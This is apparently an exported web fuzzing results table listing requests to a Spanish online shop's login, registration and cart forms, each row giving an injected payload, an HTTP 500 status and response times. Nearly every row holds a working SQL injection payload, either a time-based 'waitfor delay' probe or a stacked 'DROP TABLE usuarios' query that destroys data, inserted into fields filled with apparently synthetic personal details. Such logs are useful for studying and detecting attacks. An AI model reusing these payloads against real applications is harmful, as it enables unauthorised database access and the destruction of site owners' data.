Request	Payload	Status code	Response received	Error	Timeout	Length	Comment
77	"Credenciales incorrectas','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
78	"entrar | odecki | le080i12 | off | ','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	123	false	false	2619	
81	"registro | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | segundar | Armelio | Gochez | shankley@discon.sz | 25054750E | C/ Fuente Del Rey, S/N,  | Gavilanes | 36110 | Salaman ...	500	102	false	false	2619	
83	"entrar | zakarow','0','0');waitfor delay '0:0:15';-- | e4pe5imenta2a | on | Entrar HTTP/1.1"	500	115	false	false	2619	
84	"Vaciar carrito','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
85	"entrar | dane | e3970iv4r | ','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	115	false	false	2619	
86	"registro | prestipi | 9Odad7 | William | Albella Sahagun | northrup@ajuntamentbarcelona20.mu | 33293484H');waitfor delay '0:0:15';-- | Bizenta Mogel 65,  | Casas de Reina | 42216 | Madrid | 89642 ...	500	97	false	false	2619	
89	Credenciales incorrectas'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	103	false	false	2619	
91	"insertar | ','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	103	false	false	2619	
92	"','0');waitfor delay '0:0:15';-- | marconi1 | adularia | Venancio | Del Campillo Aranda | blier@ropadegolf.com.at | 70108873C | Paratge Pla 18 8?D | Sotorribas | 15391 | Soria | 6078216616409598  ...	500	132	false	false	2619	
94	"entrar | lombardy','0','0','0');waitfor delay '0:0:15';-- | j543ihue3a | on | Entrar HTTP/1.1"	500	132	false	false	2619	
95	2');waitfor delay '0:0:15';-- HTTP/1.1	500	103	false	false	2619	
96	"Credenciales incorrectas','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	111	false	false	2619	
97	"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	111	false	false	2619	
98	"Vaciar carrito','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	79	false	false	2619	
99	"registro | jessalyn | tra8ucaire | Ventura | Codinacs Bellver | nace@9horas.mg | 55526590J | C/ Zumalacarregui 4 11?H | ','0','0');waitfor delay '0:0:15';-- | 40541 | Segovia | 2481775887753084 | ...	500	93	false	false	2619	
101	"registro | alair | TubuL6s8 | Reade | Elecciones Iznaga','0','0','0');waitfor delay '0:0:15';-- | rypdal.hidayat@hiperbilbao.bw | 65285775E | Condor, 82 13?E | Paracuellos de la Ribera | 34870 |  ...	500	59	false	false	2619	
103	registro | pascali | o73-r1111 | Helidora | Estrems | cederlund-sol@aulahost.qa | 90572791X | Calle Urquizu 190 11?F | Santa Magdalena de Pulpis | 05697 | Zaragoza'; DROP TABLE usuarios; SELECT *  ...	500	93	false	false	2619	
104	insertar | 7744 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	73	false	false	2619	
105	"','0','0','0','0');waitfor delay '0:0:15';-- | cecelia | terciopelado | Federica | Heusser Talo | sofaer@multasdetransito.cu | 67293578V | Plza. Irantzuko Monasterioaren 63,  | Purullena | 41111  ...	500	73	false	false	2619	
106	Vaciar carrito';waitfor delay '0:0:15';-- HTTP/1.1	500	73	false	false	2619	
110	entrar | hope | infR06g9ble | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	85	false	false	2619	
112	"registro | bagnato33 | prescindible | Hiram','0','0','0','0');waitfor delay '0:0:15';-- | Penagos Pijoan | fenell@salsaspain.fr | 11130412E | C/ Leon Pinelo, 5 3E | Cordovilla | 10320 | Navarra | ...	500	84	false	false	2619	
114	entrar | robyn | frutillero');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1	500	98	false	false	2619	
115	"insertar','0','0','0');waitfor delay '0:0:15';-- | 2542 | Confirmar HTTP/1.1"	500	75	false	false	2619	
116	Credenciales incorrectas';waitfor delay '0:0:15';-- HTTP/1.1	500	98	false	false	2619	
120	entrar | chihchie');waitfor delay '0:0:15';-- | unicidad | off | Entrar HTTP/1.1	500	85	false	false	2619	
121	entrar | chihchie | unicidad | off | ');waitfor delay '0:0:15';-- HTTP/1.1	500	111	false	false	2619	
125	"entrar | an-son | 4up493a562i5 | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	86	false	false	2619	
126	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 4up493a562i5 | on | Entrar HTTP/1.1"	500	72	false	false	2619	
127	insertar | 5289 | Pasar por caja');waitfor delay '0:0:15';-- HTTP/1.1	500	86	false	false	2619	
129	2 | Queso Manchego | 39 | 27 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	88	false	false	2619	
131	insertar | 7436 | Confirmar';waitfor delay '0:0:15';-- HTTP/1.1	500	83	false	false	2619	
133	"registro | hilwa | 79b664ve80 | Delva | Campas Ferrete | everrett@fernandosoto.zr | ','0','0','0','0');waitfor delay '0:0:15';-- | Calle Salares 27 9-B | Teresa | 10162 | Alicante | 8640086440167 ...	500	104	false	false	2619	
134	"registro | torok | 03f3so | Noel Stefani | Vilaseca Regalado | howell@zarasalud.mw | 17400980P | C/ San Andres 79, 7?A | Fontiveros | 49254 | ';waitfor delay '0:0:15';-- | 4507218709160906 | Regi ...	500	105	false	false	2619	
138	entrar | mcnair | 81cob6r | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	91	false	false	2619	
139	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 569t179e | on | Entrar HTTP/1.1"	500	116	false	false	2619	
142	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 6072 | Pasar por caja HTTP/1.1	500	103	false	false	2619	
143	"registro | hiroyuki | desbullar | Yoconda | Rosas Fabila | saiko@enlanzarote.com.cx | 29372836L | Barriada Juan Xxiii, 100,  | Almargen','0');waitfor delay '0:0:15';-- | 03812 | Toledo | 22181025 ...	500	103	false	false	2619	
145	';waitfor delay '0:0:15';-- | ovas | ric8Me6te | on | Entrar HTTP/1.1	500	68	false	false	2619	
146	"2','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	102	false	false	2619	
150	"registro | storelli | enforrar | Adelfo | Pozo Carbot | schiaftino@showenvivo.com.sy');waitfor delay '0:0:15';-- | 56891172M | Calle Virgen De La Estrella, 150,  | Fresno de Rodilla | 49624 | Val ...	500	102	false	false	2619	
151	"registro | swick | recalzar | Amiel | Del Blanco | ying-carridine@audiosat.sy | 55739537A | Jose Cadierno 186, 6F | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 37621 | Astu ...	500	111	false	false	2619	
152	"entrar','0','0');waitfor delay '0:0:15';-- | zaretsky | 725l479zo | on | Entrar HTTP/1.1"	500	104	false	false	2619	
153	entrar | zaretsky | 725l479zo | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	103	false	false	2619	
155	entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | hua-yuan | *anoria | off | Entrar HTTP/1.1	500	104	false	false	2619	
156	"','0','0');waitfor delay '0:0:15';-- | 2158 | Pasar por caja HTTP/1.1"	500	103	false	false	2619	
158	"insertar | ','0','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	103	false	false	2619	
159	registro | brittan | al9mb+532 | Onila | Furcat Zarco | greiff@opticaweb.bu | 36455660Q | Calle Nueve 57 '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Utiel | 01899 | Madrid | ...	500	107	false	false	2619	
161	"entrar | crommie | 0eju0o','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"	500	106	false	false	2619	
163	entrar | jasver9');waitfor delay '0:0:15';-- | 76r9v3t2 | off | Entrar HTTP/1.1	500	115	false	false	2619	
164	"insertar','0','0','0','0');waitfor delay '0:0:15';-- | 2018 | Pasar por caja HTTP/1.1"	500	116	false	false	2619	
165	"registro | correa | 5orTeRa | Fructuosa | Polloni Homdedeu | berto@sindualidad.dd | 49742539W | C/ Einstein, 147, 9?A | Legazpi | 44349','0');waitfor delay '0:0:15';-- | Valencia | 21693885396287 ...	500	115	false	false	2619	
167	2'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	115	false	false	2619	
168	"registro | alexi | cUerdA | Donardo | Paracoll','0');waitfor delay '0:0:15';-- | filho@encuentrodominios.is | 01722111D | Enric Granados 137,  | Ruesca | 47248 | Alicante | 0825150389138142 | Reg ...	500	115	false	false	2619	
169	"insertar | 2373 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	115	false	false	2619	
170	"entrar | heunis | ','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	87	false	false	2619	
172	"entrar | ','0','0','0','0');waitfor delay '0:0:15';-- | gAMar9a | off | Entrar HTTP/1.1"	500	92	false	false	2619	
173	"insertar','0','0','0');waitfor delay '0:0:15';-- | 3471 | Confirmar HTTP/1.1"	500	93	false	false	2619	
174	"','0','0');waitfor delay '0:0:15';-- | 8137 | Pasar por caja HTTP/1.1"	500	71	false	false	2619	
175	';waitfor delay '0:0:15';-- | rybczyns | 2a530na9 | on | Entrar HTTP/1.1	500	91	false	false	2619	
176	insertar | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Confirmar HTTP/1.1	500	91	false	false	2619	
177	"1','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	91	false	false	2619	
178	"registro | colline | h30i2o | Sylvina | Mateu Bernaus','0');waitfor delay '0:0:15';-- | sorili@am-si.nf | 75667654T | C/ Del Torrent De L'olla, 111 11?D | Fuerte del Rey | 49610 | Guadalajara | 5 ...	500	93	false	false	2619	
180	insertar | 6987';waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1	500	103	false	false	2619	
181	"entrar | ketan | reng1era','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"	500	103	false	false	2619	
182	"insertar | 8559 | Pasar por caja','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	95	false	false	2619	
184	"registro | gilly | f+emenciar | Octaviano'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Heredia Wald | meskill_ferlinghetti@wormee.pw | 37936735Y | C/ Ginebre, 98  | Manzanill ...	500	106	false	false	2619	
185	insertar | 8588 | Confirmar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	75	false	false	2619	
186	"','0','0','0');waitfor delay '0:0:15';-- | 8588 | Confirmar HTTP/1.1"	500	105	false	false	2619	
188	"2','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	106	false	false	2619	
189	"registro | horak | 6eSi74osO | Blas | Gasca Noria | dearden@hipermadrid.ga | 01101234V | Avenida Comunidad De Madrid 45, 13C | Villarreal de Huerva'; DROP TABLE usuarios; SELECT * FROM datos WHER ...	500	105	false	false	2619	
191	insertar | ';waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1	500	107	false	false	2619	
196	"entrar','0','0','0');waitfor delay '0:0:15';-- | goldstei | exp8a1!a6a | on | Entrar HTTP/1.1"	500	114	false	false	2619	
199	entrar | eckstein | requeridor | on | ';waitfor delay '0:0:15';-- HTTP/1.1	500	113	false	false	2619	
200	"registro | checinsk | c2ad953u8ro | Neria | Taronger | torgov-mattera@yksoluap.edu | 74014005M | Avenida Roque De Gando, 193, 7?E | Castrobol | 26324 | Cuenca | 5680554856223107 | ';waitfor delay ...	500	70	false	false	2619	
201	"entrar','0','0');waitfor delay '0:0:15';-- | drappel | innoc52 | off | Entrar HTTP/1.1"	500	109	false	false	2619	
202	"insertar','0','0','0');waitfor delay '0:0:15';-- | 3732 | Confirmar HTTP/1.1"	500	68	false	false	2619	
203	"entrar','0','0','0');waitfor delay '0:0:15';-- | roddie9 | 2esu1ador3 | on | Entrar HTTP/1.1"	500	109	false	false	2619	
204	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | 2esu1ador3 | on | Entrar HTTP/1.1"	500	84	false	false	2619	
205	"registro | norio8 | 4l7ct4ot7pi5a | Jaen | Alicante Oruna | cumby@blogsmegumi.ly','0','0','0','0');waitfor delay '0:0:15';-- | 01105274D | Calle German Monzon Gamon, 46  | Puente la Reina de Jaca ...	500	84	false	false	2619	
206	registro | jovo | 28l3ra8a | Hebelen | Fornalino Grimaldi | ozaki_wanamaker@travelzone.tel | 75981771Y | Calle San Juan Bautista De La Salle 193 6?C | Calatorao | 10191 | Burgos | 3393638948319901 ...	500	85	false	false	2619	
207	"','0','0');waitfor delay '0:0:15';-- | 4221 | Confirmar HTTP/1.1"	500	77	false	false	2619	
208	entrar | sydney | r$aToNESCA | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	85	false	false	2619	
209	"','0','0','0','0');waitfor delay '0:0:15';-- | 9014 | Confirmar HTTP/1.1"	500	84	false	false	2619	
210	"registro | chaya | c0o4c53TI81 | Zbigniew | Becares Alumbreo | ','0','0');waitfor delay '0:0:15';-- | 23423909L | Nucleo Residencial San Carlos, 5, 3?H | Herrera | 33785 | Soria | 212479318651814 ...	500	72	false	false	2619	
211	"registro | bnrecad | iN!solUBLe | Aurelio | Ospina Soma | humbert@24htranslations.name | 78151636M | Ramat, 145 5?B | Barbastro | 31227 | Valladolid | 5175468282615613 | '; DROP TABLE usuarios; S ...	500	109	false	false	2619	
213	"insertar | 4965 | Pasar por caja','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	88	false	false	2619	
215	"insertar | 3574 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	69	false	false	2619	
216	entrar | hedrich | chonta | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	114	false	false	2619	
219	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 6606 | Pasar por caja HTTP/1.1	500	69	false	false	2619	
220	"insertar | 9567','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	106	false	false	2619	
222	2';waitfor delay '0:0:15';-- HTTP/1.1	500	92	false	false	2619	
226	"insertar | 8146','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	101	false	false	2619	
228	"registro | mckillop | margraviato | Leonor | Pantiga Corredor | miranoa@enla.web | 36674466T | Mencia Calderon, 170, 13B | Manzanares de Rioja | 05427 | Vizcaya');waitfor delay '0:0:15';-- | 7784 ...	500	73	false	false	2619	
229	"registro | ofcparms | mutabIlidad | Petronio | Pedrol | cadoret@escuelamontessori.pa | 17229359J | Hermanas Sanchez Tamargo, 56  | Moreruela de los Infanzones | ','0');waitfor delay '0:0:15';-- | ...	500	89	false	false	2619	
231	entrar | ohio | acerrador'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | off | Entrar HTTP/1.1	500	96	false	false	2619	
232	"registro | ','0','0','0','0');waitfor delay '0:0:15';-- | al55nza | Randolfo | Rovirola Noiran | semmelrogge@spainpharma.zm | 73500117Y | Pl. Aranjuez, S/N  | Sobremunt | 18127 | Tarragona | 1198 ...	500	85	false	false	2619	
233	"insertar | 5934 | Confirmar','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	98	false	false	2619	
235	"registro | mirabell | implIcaNte','0');waitfor delay '0:0:15';-- | Yayn | Boliart Jubert | karlatos-woodcroft@joyaseleccion.fr | 90456703A | Avenida Vigo 194  | Olula de Castro | 07195 | Cuenca | ...	500	93	false	false	2619	
236	"registro | winsberg | flagicio | Lihuel | Novell Abenoza | hasserman@clinicadentalsansalvador.ua | 95659491F | Federico Garcia Lorca, 132,  | Riudoms | 36960 | ';waitfor delay '0:0:15';-- | 13437 ...	500	94	false	false	2619	
240	"registro','0','0','0','0');waitfor delay '0:0:15';-- | lovell | 5gOtA15r0 | Mardoqueo | Zenteno Llunell | gebert.vrdoltak@intg.md | 55492932G | Conde De Las Infantas 30 8?F | Metauten | 10120 | M ...	500	90	false	false	2619	
243	';waitfor delay '0:0:15';-- | 88 | Confirmar HTTP/1.1	500	83	false	false	2619	
244	"','0','0','0','0');waitfor delay '0:0:15';-- | 7990 | Pasar por caja HTTP/1.1"	500	80	false	false	2619	
245	entrar | catlin | v76c088rA | off'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	84	false	false	2619	
246	"1','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	82	false	false	2619	
252	"registro | schwenk | iNfINitIvO | Tarciano','0','0');waitfor delay '0:0:15';-- | Varela Pulido | strizhenova-boston@hrmsl.kh | 36249511Q | Barrio Vidal 132, 13?B | Rubite | 50160 | Zamora | 62950 ...	500	82	false	false	2619	
254	"insertar | ','0','0','0');waitfor delay '0:0:15';-- | Pasar por caja HTTP/1.1"	500	83	false	false	2619	
256	"2','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	78	false	false	2619	
257	entrar | frasco | .ag091766so | ';waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	78	false	false	2619	
258	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7191 | Confirmar HTTP/1.1	500	74	false	false	2619	
260	"registro | watchorn | gin09r9n3 | Alcira | Marcapura Pachecote | wolheim@soyrojo.se | 79531407Y | ','0');waitfor delay '0:0:15';-- | Deleitosa | 49410 | Baleares (Illes) | 4881993166167995 | Regi ...	500	75	false	false	2619	
261	"insertar | 8896','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	93	false	false	2619	
262	"registro | gamaleld | t54p-4l | Shunko | Volta Piriz | guarneros@elfisioencasa.eu | 78789686N | Menorca 13, 2?H | Villagonzalo','0','0','0','0');waitfor delay '0:0:15';-- | 31495 | Granada | 4253 ...	500	89	false	false	2619	
263	2 | Queso Manchego | 39 | 76 | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	81	false	false	2619	
265	entrar | mobley | r10bo9b7 | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	81	false	false	2619	
266	"registro | nerby5 | te6b8anTe | Rosarito | Millan Guiral | goldsborough4@sevach.name | 47183982B | C/ Jardins Dels Gegants De Gracia 143, 11-H | Melgar de Abajo | 06228 | ');waitfor delay '0:0:15 ...	500	76	false	false	2619	
267	"insertar | 9853 | Pasar por caja','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	76	false	false	2619	
268	"registro | chatchai | chismorrear | Rachid | Mingo Elbaile | schkorski@elxxi.zr | 26852714F | Paraguay, 88, 5?E | Aulesti | ','0','0','0','0');waitfor delay '0:0:15';-- | La Rioja | 2647099047093 ...	500	90	false	false	2619	
269	entrar | patricio | galo1he0o | ';waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	85	false	false	2619	
270	"insertar','0','0');waitfor delay '0:0:15';-- | 2789 | Pasar por caja HTTP/1.1"	500	85	false	false	2619	
273	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 3714 | Confirmar HTTP/1.1	500	117	false	false	2619	
274	"registro | charla | hi09otismo | Zita | Puerto | robb-ghostley@botilleria.com.sb','0');waitfor delay '0:0:15';-- | 09531645P | Calle Dresde 25 6?D | Molezuelas de la Carballeda | 08281 | Baleares ...	500	194	false	false	2619	
276	"registro | kanya | trasladadora | Angelo | Goya Asensio | bowers@puntodevistafotografia.gf | 56007542N | C/ Baja 58, 1?H | Helechosa de los Montes | 10181 | Valencia | 8914897432837758 | ','0','0 ...	500	176	false	false	2619	
280	';waitfor delay '0:0:15';-- | 9468 | Pasar por caja HTTP/1.1	500	156	false	false	2619	
285	"entrar | chandras','0','0','0','0');waitfor delay '0:0:15';-- | h+olgona | on | Entrar HTTP/1.1"	500	75	false	false	2619	
286	insertar | 3650'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Confirmar HTTP/1.1	500	79	false	false	2619	
291	"registro | crafton | p2_l5ote | Peregrina | Mengual Bartumeu | feliciano@atorre.mobi | 80328105F | Calle Zurbaran, 131,  | ','0','0');waitfor delay '0:0:15';-- | 48195 | Sevilla | 416882760979879 ...	500	75	false	false	2619	
292	"registro | lachance | su5a | Rogato | Cucarell Caridad | zmed@tabernarinconete.uk | 19477061V';waitfor delay '0:0:15';-- | Manuel Paez Xaramillo 33, 6B | Estella/Lizarra | 26321 | Tarragona | 999 ...	500	119	false	false	2619	
293	"entrar','0','0','0','0');waitfor delay '0:0:15';-- | zaretsky | 40c7c0o | off | Entrar HTTP/1.1"	500	121	false	false	2619	
294	entrar | durward | cOrDElAzO | on | ');waitfor delay '0:0:15';-- HTTP/1.1	500	60	false	false	2619	
295	registro | lysinger | D9SOr9an21a2oR | Giovana | Planelles Neris | measor.barezewska@enlanzarote.com.gq | 54498003D | C/ Fuensanta 41  | ';waitfor delay '0:0:15';-- | 32650 | Huesca | 507032829261 ...	500	76	false	false	2619	
296	"registro | nady | 9va3831','0','0');waitfor delay '0:0:15';-- | Shirley | Urbaez Mariangel | erlich-jarrel@modeloscaninos.ni | 39759775C | Algarrobo 197 3?F | Navalonguilla | 50268 | Segovia | 50 ...	500	83	false	false	2619	
297	'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 5080 | Pasar por caja HTTP/1.1	500	113	false	false	2619	
299	"entrar | perkins','0','0','0','0');waitfor delay '0:0:15';-- | 7ad524z | off | Entrar HTTP/1.1"	500	86	false	false	2619	
300	insertar | 1980 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	86	false	false	2619	
304	entrar | pagi | refr2nd0 | off');waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	86	false	false	2619	
305	"entrar | lemmie | InteMPesTI+vo | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	83	false	false	2619	
306	entrar | schlacht | 43s8a | off | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% HTTP/1.1	500	78	false	false	2619	
307	"registro | eamonn | 673que422 | Arador | Gala Vaquer | killorin@lodgeinmadrid.gl | 38367717Z | Grup De La Torre Lloveta 145  | Huerta de Rey | 31133 | Huesca | 5414663163826513 | ','0','0','0','0 ...	500	76	false	false	2619	
308	entrar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1	500	113	false	false	2619	
309	'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | chaar | pe4ibl171o | on | Entrar HTTP/1.1	500	112	false	false	2619	
310	insertar'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | 7701 | Confirmar HTTP/1.1	500	71	false	false	2619	
312	';waitfor delay '0:0:15';-- | 3858 | Pasar por caja HTTP/1.1	500	112	false	false	2619	
313	"entrar | faez | 9fi247A | ','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	113	false	false	2619	
314	"entrar | girouard | Disgu5TAd1','0','0','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"	500	112	false	false	2619	
316	');waitfor delay '0:0:15';-- | 622 | Pasar por caja HTTP/1.1	500	110	false	false	2619	
317	entrar | rizzardi | 332G3le8a | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | Entrar HTTP/1.1	500	96	false	false	2619	
318	"registro','0','0');waitfor delay '0:0:15';-- | gerhardt8 | pizmie+nta | Yamila | Cardalliaguet Yescas | armantel@laspruebascongaseosa.vg | 65724136A | Castro Canseco 8 5?H | Oria | 17538 | Albace ...	500	111	false	false	2619	
319	"insertar | 3076 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	98	false	false	2619	
320	"registro | xi-xian9'; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | p?erspicacidad | Geraldo | Pedrol | chalon@ingenelec.gl | 10207822P | C/ Paloma, 197  | Laguna Dalga | 47520  ...	500	97	false	false	2619	
322	"insertar | 5191 | ','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	98	false	false	2619	
323	insertar | 8865 | ');waitfor delay '0:0:15';-- HTTP/1.1	500	97	false	false	2619	
324	"entrar | ','0','0','0');waitfor delay '0:0:15';-- | espesamente | on | Entrar HTTP/1.1"	500	97	false	false	2619	
328	"','0');waitfor delay '0:0:15';-- | 8384 | Confirmar HTTP/1.1"	500	96	false	false	2619	
329	insertar | 6541';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1	500	113	false	false	2619	
330	insertar | 4633';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1	500	114	false	false	2619	
331	insertar | 5698 | Pasar por caja';waitfor delay '0:0:15';-- HTTP/1.1	500	114	false	false	2619	
332	"entrar','0','0','0');waitfor delay '0:0:15';-- | krowlek | veintidoseno | off | Entrar HTTP/1.1"	500	64	false	false	2619	
334	"insertar | 2426 | Confirmar','0','0','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	114	false	false	2619	
335	"entrar | dionysus | vuesa | on','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	113	false	false	2619	
337	"registro | torsten | quienq!uier | Ceciliano | De la Llave Graell | tambor@archivodeimagenes.mu | 79001087C | C/ Recanto Da Mapoula 87 8?A | Luzaide/Valcarlos | 33610 | Madrid | 3747055026532862' ...	500	100	false	false	2619	
338	"registro | torsten | quienq!uier | Ceciliano | De la Llave Graell | tambor@archivodeimagenes.mu | 79001087C | C/ Recanto Da Mapoula 87 8?A | ','0','0');waitfor delay '0:0:15';-- | 33610 | Madrid  ...	500	82	false	false	2619	
340	insertar | ';waitfor delay '0:0:15';-- | Confirmar HTTP/1.1	500	97	false	false	2619	
342	"entrar | ranbir | ','0');waitfor delay '0:0:15';-- | off | Entrar HTTP/1.1"	500	98	false	false	2619	
343	"insertar | 5716 | ','0','0');waitfor delay '0:0:15';-- HTTP/1.1"	500	97	false	false	2619	
344	entrar | '; DROP TABLE usuarios; SELECT * FROM datos WHERE nombre LIKE '% | caLabrotar | on | Entrar HTTP/1.1	500	98	false	false	2619	
345	"insertar | 7988','0','0','0');waitfor delay '0:0:15';-- | Confirmar HTTP/1.1"	500	98	false	false	2619	
347	"entrar | sturrock | 60509etr4 | off','0','0','0','0');waitfor delay '0:0:15';-- | Entrar HTTP/1.1"	500	73	false	false	2619	
348	"registro | gray | 2s4e49 | Sadao | Mengual Bartumeu | mckinnell@arvigar.eu | 43595909F | Calle Arenal 153,  | Hornos de Moncalvillo','0','0','0','0');waitfor delay '0:0:15';-- | 34349 | Granada | ...	500	110	false	false	2619	
350	"entrar | heinonen | ','0','0');waitfor delay '0:0:15';-- | on | Entrar HTTP/1.1"	500	101	false	false	2619	
351	"');waitfor delay '0:0:15';-- | linebarg | 6A6ejo | Adiberto | Baro Guizasola | knoch@cortinasartesol.rs | 40660740Y | Calle Rio Nervion, 124  | Villalbilla | 10269 | Asturias | 3612762380089374 | ...	500	104	false	false	2619	
352	"registro | whalen54 | guapote | ','0');waitfor delay '0:0:15';-- | Agea Genova | fegan@unidadesdeventilacion.az | 39065739D | Fortaleza Hacho 199 11H | Espinosa de los Monteros | 11610 | Cuenca | ...	500	104	false	false	2619	
357	entrar | takagi71 | b6e | ');waitfor delay '0:0:15';-- | Entrar HTTP/1.1	500	104	false	false	2619	
